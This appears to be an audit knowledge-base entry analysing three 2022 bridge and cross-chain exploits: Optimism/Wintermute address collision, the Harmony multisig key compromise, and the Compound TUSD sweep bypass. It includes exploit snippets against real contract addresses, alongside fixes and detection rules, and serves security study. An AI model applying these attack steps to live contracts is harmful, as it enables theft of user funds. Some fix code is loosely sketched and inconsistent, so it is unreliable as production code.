---
protocol: Multi-Protocol
chain: Ethereum, Optimism, Harmony
category: bridge
vulnerability_type: Bridge and Cross-Chain Security Patterns
attack_type:
  - Cross-chain address collision via CREATE nonce replay
  - Compromised multisig keys with low threshold
  - Token proxy dual-address bypass
source: DeFiHackLabs
total_exploits_analyzed: 3
total_losses: "$115M+"
affected_component:
  - L2 bridge deposits
  - Cross-chain multisig wallets
  - Bridge token lockers
  - Compound sweep functions
  - Proxy token addressing
primitives:
  - cross_chain
  - address_collision
  - multisig_compromise
  - proxy_bypass
  - token_sweep
severity: CRITICAL
impact: Full bridge drain, token theft, address takeover
exploitability: Medium to High
financial_impact: "$115M+ aggregate"
tags:
  - defihacklabs
  - bridge
  - cross-chain
  - l2-replay
  - address-collision
  - create-nonce
  - multisig
  - key-compromise
  - token-proxy
  - dual-address
  - sweep-bypass
  - harmony
  - optimism-wintermute
  - compound-tusd
---

# DeFiHackLabs Bridge & Cross-Chain Security Patterns (2022)

## Overview

This entry catalogs 3 high-profile cross-chain and bridge-related exploits from 2022 sourced from [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs). These represent the most impactful class of vulnerabilities in 2022, with combined losses exceeding $115M.

**Categories covered:**
1. **Cross-Chain Address Collision** — CREATE nonce replay to steal L2 deposits ($15M)
2. **Bridge Multisig Key Compromise** — Insufficient signing threshold enables drain ($100M)
3. **Token Proxy Dual-Address Bypass** — Legacy proxy address bypasses sweep guard (full market)

---

## Vulnerability Description

### Root Cause Analysis

Bridge and cross-chain vulnerabilities differ from standard DeFi exploits because they span multiple execution environments:

1. **Address Determinism Across Chains**: Addresses created via `CREATE` are deterministic (deployer + nonce). If a contract exists at address X on L1 but hasn't been deployed on L2, an attacker can deploy at the same address on L2 by replaying proxy factory calls until the nonce matches. (Optimism/Wintermute — $15M)

2. **Insufficient Multisig Threshold**: A 2-of-5 signing threshold means compromising just 2 keys (40%) gives full bridge control. On-chain bridges holding $100M+ should require higher thresholds (e.g., 4-of-7 or 5-of-9) with diverse key custody. (Harmony — $100M)

3. **Token Identity Confusion via Proxy Patterns**: Some tokens (e.g., TUSD) use a proxy pattern where a legacy address delegates to the current implementation. If a protocol checks `token != underlying` using only the current address, the legacy address passes the check while still operating on the same token. (Compound TUSD — full cTUSD market)

### Attack Scenarios

**Scenario 1: Cross-Chain Address Collision (Optimism/Wintermute)**
```
1. Wintermute receives 20M OP tokens on Optimism to their L1 Gnosis Safe address
2. The Gnosis Safe has NOT been deployed on Optimism yet
3. Attacker calls ProxyFactory.createProxy() repeatedly on Optimism
4. Each call increments the factory nonce → deterministic CREATE address changes
5. Eventually, the created proxy address matches Wintermute's expected address
6. Attacker now controls a contract at that address → drains 20M OP tokens
```

**Scenario 2: Compromised Bridge Multisig (Harmony)**
```
1. Harmony bridge uses a 2-of-5 multisig to authorize token unlocks
2. Attacker compromises 2 of 5 private keys
3. Attacker calls submitTransaction(unlockToken(USDT, 9.98M, attacker))
4. Attacker calls confirmTransaction with second key → meets 2-of-5 threshold
5. Transaction auto-executes → 9.98M USDT unlocked to attacker
6. Repeat for other tokens → ~$100M total
```

**Scenario 3: Token Proxy Dual-Address Bypass (Compound TUSD)**
```
1. cTUSD market has sweepToken() to recover accidentally-sent tokens
2. Guard: require(token != underlying) prevents sweeping TUSD directly
3. TUSD has a legacy address (0x8dd5...) that delegates to current TUSD (0x0000...)
4. Attacker calls sweepToken(tusdLegacy)
5. Guard passes: tusdLegacy != underlying (different addresses)
6. But tusdLegacy.transfer() delegates to real TUSD → sweeps all TUSD from cTUSD market
```

---

## Vulnerable Pattern Examples

### Pattern 1: Cross-Chain Address Collision via CREATE Nonce Replay

**Severity**: 🔴 CRITICAL | **Loss**: 20M OP (~$15M) | **Protocol**: Optimism/Wintermute | **Chain**: Optimism

Addresses created via `CREATE` opcode are deterministic: `keccak256(rlp([deployer, nonce]))`. If a Gnosis Safe exists at address X on L1 via the `ProxyFactory`, the same address can be claimed on L2 by replaying `createProxy` calls until the factory's nonce produces the same address.

```solidity
// @audit-issue CREATE address is deterministic — attacker replays until match
contract OptimismExploit {
    address public childcontract;
    address constant TARGET = 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81;
    
    function testExploit() public {
        // @audit Brute-force proxy creation until address matches target
        while (childcontract != TARGET) {
            childcontract = proxy.createProxy(
                0xE7145dd6287AE53326347f3A6694fCf2954bcD8A, // master copy
                "0x"  // empty initializer
            );
        }
        // @audit childcontract == TARGET → attacker controls the proxy
        // All 20M OP tokens sent to this address are now accessible
    }
}

// The deterministic address formula:
// address = keccak256(rlp([proxyFactory, nonce]))[12:]
// By creating proxies until nonce matches L1's deployment nonce,
// attacker gets the same address on L2
```

**Reference**: [DeFiHackLabs/src/test/2022-06/Optimism_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/Optimism_exp.sol) | Block: 10,607,735 (Optimism)

---

### Pattern 2: Compromised Multisig Keys with Low Threshold

**Severity**: 🔴 CRITICAL | **Loss**: ~$100M | **Protocol**: Harmony Horizon Bridge | **Chain**: Ethereum

The Harmony bridge used a 2-of-5 multisig wallet to authorize cross-chain token unlocks. Compromising just 2 private keys (40% of signers) was sufficient to drain the entire bridge.

```solidity
// @audit-issue 2-of-5 threshold — compromising 2 keys drains the bridge
function testExploit() public {
    address compromisedKey1 = 0xf845A7ee8477AD1FB4446651E548901a2635A915;
    address compromisedKey2 = 0x812d8622C6F3c45959439e7ede3C580dA06f8f25;
    
    // Encode the bridge unlock message
    bytes memory unlockPayload = abi.encodeWithSignature(
        "unlockToken(address,uint256,address,bytes32)",
        address(USDT),        // token to unlock
        9_981_000_000_000,    // 9.98M USDT
        address(attacker),    // recipient
        receiptId             // fake receipt ID
    );
    
    // @audit Submit unlock transaction with first compromised key
    cheat.prank(compromisedKey1);
    uint256 txId = MultiSigWallet.submitTransaction(
        0x2dCCDB493827E15a5dC8f8b72147E6c4A5620857,  // bridge locker
        0,
        unlockPayload
    );
    
    // @audit Confirm with second compromised key → meets 2-of-5 threshold
    // Transaction auto-executes → 9.98M USDT drained
    cheat.prank(compromisedKey2);
    MultiSigWallet.confirmTransaction(txId);
    
    // @audit Repeat for ETH, WBTC, USDC, DAI → ~$100M total
}
```

**Reference**: [DeFiHackLabs/src/test/2022-06/Harmony_multisig_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/Harmony_multisig_exp.sol) | Block: 15,012,645

---

### Pattern 3: Token Proxy Dual-Address Bypass on Sweep Function

**Severity**: 🔴 CRITICAL | **Loss**: All cTUSD market balance | **Protocol**: Compound | **Chain**: Ethereum

TUSD uses a proxy pattern where the legacy address (`0x8dd5...`) delegates to the current implementation (`0x0000...`). Compound's `sweepToken` checks `token != underlying` using only the current address. The legacy address passes this check while still operating on the same token.

```solidity
// @audit-issue sweepToken guard checks current address only — legacy address bypasses it
function testExploit() public {
    // Current TUSD proxy address (what Compound checks against)
    address underlying = 0x0000000000085d4780B73119b644AE5ecd22b376;
    
    // Legacy TUSD address — delegates all calls to current proxy
    address tusdLegacy = 0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E;
    
    // @audit sweepToken internal check:
    // require(address(token) != underlying); 
    // tusdLegacy != underlying → PASSES (different addresses!)
    
    // @audit But tusdLegacy.transfer() → forwards to real TUSD → sweeps ALL TUSD
    cTUSD.sweepToken(EIP20NonStandardInterface(tusdLegacy));
    
    // Result: All TUSD drained from Compound's cTUSD market
    // Because tusdLegacy is just another entry point to the same token
}

// Why this works:
// Legacy TUSD contract:
// fallback() {
//     (bool success,) = currentTUSDProxy.delegatecall(msg.data);
// }
// Calling tusdLegacy.transfer() → delegates to real TUSD → moves real TUSD tokens
```

**Reference**: [DeFiHackLabs/src/test/2022-03/CompoundTusd_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/CompoundTusd_exp.sol) | Block: 14,266,479

---

## Impact Analysis

| Protocol | Date | Loss | Root Cause | Chain |
|----------|------|------|-----------|-------|
| Harmony Bridge | Jun 2022 | ~$100M | 2-of-5 multisig key compromise | Ethereum |
| Optimism/Wintermute | Jun 2022 | ~$15M | CREATE nonce address collision | Optimism |
| Compound TUSD | Mar 2022 | Full market | Token proxy dual-address bypass | Ethereum |

**Aggregate**: Over $115M in losses from bridge and cross-chain vulnerabilities.

---

## Secure Implementation

### Fix 1: Use CREATE2 with Immutable Salt for Cross-Chain Deployments

```solidity
// SECURE: Use CREATE2 with a chain-specific salt for cross-chain deployments
contract SecureProxyFactory {
    // @audit-fix CREATE2 address is deterministic from (factory, salt, initCodeHash)
    // Salt includes chain ID → same address can ONLY be created by the same factory with same params
    function createProxyWithNonce(
        address masterCopy,
        bytes memory initializer,
        uint256 saltNonce
    ) public returns (address proxy) {
        // @audit-fix Include chain ID in salt to prevent cross-chain replay
        bytes32 salt = keccak256(
            abi.encodePacked(
                keccak256(initializer),
                saltNonce,
                block.chainid  // Chain-specific!
            )
        );
        
        bytes memory deploymentData = abi.encodePacked(
            proxyCreationCode,
            uint256(uint160(masterCopy))
        );
        
        assembly {
            proxy := create2(0, add(deploymentData, 0x20), mload(deploymentData), salt)
        }
        require(proxy != address(0), "Create2 failed");
    }
}
```

### Fix 2: Higher Multisig Threshold + Time Delays for Bridges

```solidity
// SECURE: Higher threshold + time locks for bridge operations
contract SecureBridge {
    uint256 public constant MIN_SIGNERS = 5;
    uint256 public constant THRESHOLD = 4;  // 4-of-7 or higher
    uint256 public constant UNLOCK_DELAY = 24 hours;
    uint256 public constant MAX_SINGLE_UNLOCK = 1_000_000e18;
    
    struct PendingUnlock {
        address token;
        uint256 amount;
        address recipient;
        uint256 executeAfter;
        uint256 confirmations;
        bool executed;
    }
    
    function submitUnlock(address token, uint256 amount, address recipient) external onlySigner {
        // @audit-fix Large unlocks require time delay
        require(amount <= MAX_SINGLE_UNLOCK, "Exceeds single unlock limit");
        
        pendingUnlocks[nextId] = PendingUnlock({
            token: token,
            amount: amount,
            recipient: recipient,
            executeAfter: block.timestamp + UNLOCK_DELAY,
            confirmations: 1,
            executed: false
        });
    }
    
    function confirmUnlock(uint256 id) external onlySigner {
        PendingUnlock storage unlock = pendingUnlocks[id];
        require(!hasConfirmed[id][msg.sender], "Already confirmed");
        
        hasConfirmed[id][msg.sender] = true;
        unlock.confirmations++;
        
        // @audit-fix Requires 4+ confirmations AND time delay
        if (unlock.confirmations >= THRESHOLD && block.timestamp >= unlock.executeAfter) {
            _executeUnlock(unlock);
        }
    }
}
```

### Fix 3: Comprehensive Token Identity Check for Sweep

```solidity
// SECURE: Check all known addresses for a token, not just current proxy
contract SecureCToken {
    mapping(address => bool) public knownUnderlyingAddresses;
    
    function initializeUnderlyingAddresses(address[] calldata addresses) external onlyAdmin {
        for (uint i = 0; i < addresses.length; i++) {
            knownUnderlyingAddresses[addresses[i]] = true;
        }
    }
    
    function sweepToken(IERC20 token) external onlyAdmin {
        // @audit-fix Check against ALL known addresses (current + legacy + aliases)
        require(
            !knownUnderlyingAddresses[address(token)],
            "Cannot sweep underlying token"
        );
        
        // @audit-fix Additional check: verify token code is not a proxy to underlying
        // Try calling the token and compare the actual transfer recipient
        uint256 balBefore = IERC20(underlying).balanceOf(address(this));
        token.transfer(msg.sender, token.balanceOf(address(this)));
        uint256 balAfter = IERC20(underlying).balanceOf(address(this));
        
        // @audit-fix If underlying balance changed, the swept token IS the underlying
        require(balBefore == balAfter, "Swept token is underlying via proxy");
    }
}
```

---

## Detection Patterns

### Static Analysis

```yaml
- pattern: "createProxy|create2|CREATE"
  check: "Verify cross-chain deployments use CREATE2 with chain-specific salt, not CREATE with sequential nonce"
  
- pattern: "submitTransaction|confirmTransaction|required.*=.*2"
  check: "Verify multisig threshold is appropriate for bridge TVL (minimum 60% of signers)"
  
- pattern: "sweepToken|recoverToken|rescueToken"
  check: "Verify guard checks ALL known addresses for the underlying token (current + legacy + aliases)"
  
- pattern: "unlockToken|relayMessage|executeMessage"
  check: "Verify time delays exist for large unlocks and rate limiting is enforced"
  
- pattern: "delegatecall|fallback.*delegatecall"
  check: "Check if token has multiple entry points (legacy proxies) that could bypass identity checks"
```

### Invariant Checks

```
INV-BRIDGE-001: Cross-chain contract deployment must use CREATE2 with chain-specific salt
INV-BRIDGE-002: Bridge multisig threshold must be >= 60% of total signers
INV-BRIDGE-003: Token identity checks must cover ALL known addresses (current proxy + legacy + aliases)
INV-BRIDGE-004: Large bridge unlocks (>threshold) must have mandatory time delays
INV-BRIDGE-005: Bridge must verify message origin chain and prevent cross-chain replay
INV-BRIDGE-006: Rate limiting must bound total unlock volume per time period
```

---

## Audit Checklist

- [ ] **Cross-Chain Determinism**: Are contract addresses deployed via CREATE2 with chain-specific salts? Or via CREATE with replayable nonces?
- [ ] **Multisig Threshold**: For bridges holding >$10M, is the signing threshold at least 60% of total signers? Are keys stored in diverse custody?
- [ ] **Token Identity**: Does the protocol check all known addresses for a token? Are legacy proxy addresses accounted for?
- [ ] **Time Delays**: Are large bridge operations subject to mandatory time delays?
- [ ] **Rate Limiting**: Is there a per-period cap on bridge unlock volume?
- [ ] **Key Rotation**: Are bridge signer keys regularly rotated? Are compromised keys revokable?
- [ ] **Sweep Guards**: Do token recovery functions check against proxy aliases and delegate targets?

---

## Real-World Examples

| Protocol | Date | Loss | TX/Reference |
|----------|------|------|-------------|
| Harmony Horizon Bridge | Jun 2022 | ~$100M | [Etherscan](https://etherscan.io/address/0x715CdDa5e9Ad30A0cEd14940F9997EE611496De6) |
| Optimism/Wintermute | Jun 2022 | ~$15M (20M OP) | Block 10,607,735 (Optimism) |
| Compound TUSD | Mar 2022 | Full cTUSD market | Block 14,266,479 |

---

## Keywords

bridge_security, cross_chain, address_collision, CREATE_nonce_replay, CREATE2, multisig_threshold, key_compromise, two_of_five, token_proxy, dual_address, legacy_proxy, sweep_bypass, bridge_drain, harmony, optimism, wintermute, compound_tusd, l2_replay, deterministic_address, proxy_delegation, unlockToken, sweepToken, defihacklabs
